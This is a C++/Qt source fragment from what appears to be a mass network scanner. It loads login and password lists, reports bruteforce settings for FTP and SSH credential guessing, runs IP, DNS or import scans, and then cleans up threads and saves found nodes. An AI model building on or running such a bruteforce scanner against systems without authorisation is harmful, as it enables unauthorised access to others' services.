		configOut << ANSI_CYAN << "[INFO]" << ANSI_RESET << " Adaptive scanning initialized" << Qt::endl;
	}
	
	// Load login/password lists before starting scan
	runAuxiliaryThreads();
	
	// Wait a bit for lists to load, then display bruteforce status
	Sleep(1000); // Give FileUpdater time to load lists
	
	// Display bruteforce configuration after lists are loaded
	extern int MaxLogin, MaxPass, MaxFTPLogin, MaxFTPPass, MaxSSHPass, gMaxBrutingThreads;
	if (gMaxBrutingThreads > 0) {
		configOut << "  Bruteforce: " << ANSI_GREEN << "Enabled" << ANSI_RESET << " (Max threads: " << gMaxBrutingThreads << ")" << Qt::endl;
		if (MaxLogin > 0 && MaxPass > 0) {
			configOut << "    Login list: " << MaxLogin << " entries, Password list: " << MaxPass << " entries" << Qt::endl;
		} else {
			configOut << "    " << ANSI_YELLOW << "Warning: Login/Password lists not loaded!" << ANSI_RESET << Qt::endl;
		}
		if (MaxFTPLogin > 0 && MaxFTPPass > 0) {
			configOut << "    FTP: " << MaxFTPLogin << " logins, " << MaxFTPPass << " passwords" << Qt::endl;
		}
		if (MaxSSHPass > 0) {
			configOut << "    SSH: " << MaxSSHPass << " login:password pairs" << Qt::endl;
		}
	} else {
		configOut << "  Bruteforce: " << ANSI_YELLOW << "Disabled" << ANSI_RESET << " (gMaxBrutingThreads = 0)" << Qt::endl;
	}
	configOut << Qt::endl;
	
	// Display scan start message and start appropriate scan mode
	if (gMode == 0) {
		stt->doEmitionStartScanIP();
		startIPScan();
	}
	else if (gMode == 1) {
		stt->doEmitionStartScanDNS();
		startDNSScan();
	}
	else {
		stt->doEmitionStartScanImport();
		startImportScan();
	}

	stt->doEmitionYellowFoundData("Scan completed. Stopping threads...");

	// Cleanup adaptive scanner
	if (gAdaptiveScan || gSmartScan) {
		AdaptiveScanner::cleanup();
	}
	
	// Wait for all threads to finish, with progress indication
	QTextStream waitOut(stdout);
	int waitCount = 0;
	const int MAX_WAIT_SECONDS = 60; // Maximum 60 seconds wait
	while ((cons > 0 || jsonArr->size() > 0) && waitCount < MAX_WAIT_SECONDS && globalScanFlag) {
		Sleep(1000);
		waitCount++;
		if (waitCount % 5 == 0 && (cons > 0 || jsonArr->size() > 0)) {
			waitOut << "\r[INFO] Waiting for threads to finish... (" << cons << " active, " 
			    << jsonArr->size() << " pending)    " << Qt::flush;
		}
	}
	
	waitOut << "\r" << QString(70, ' ') << "\r"; // Clear the waiting message line
	
	if (waitCount >= MAX_WAIT_SECONDS && (cons > 0 || jsonArr->size() > 0)) {
		stt->doEmitionYellowFoundData("Warning: Some threads did not finish in time. Forcing cleanup...");
	}
	
	MainStarter::saveBK();
	saveBackup = false;
	
	// Clean up threads properly
	Threader::cleanUp();
	
	thread_cleanup();

	// Print final progress line with newline
	QTextStream progressOut(stdout);
	progressOut << Qt::endl; // Finish progress line
	
	stt->doEmitionGreenFoundData("Done. Saved " + QString::number(saved) + 
		" of " + QString::number(found) + " nodes.");
	stt->doEmitionKillSttThread();
}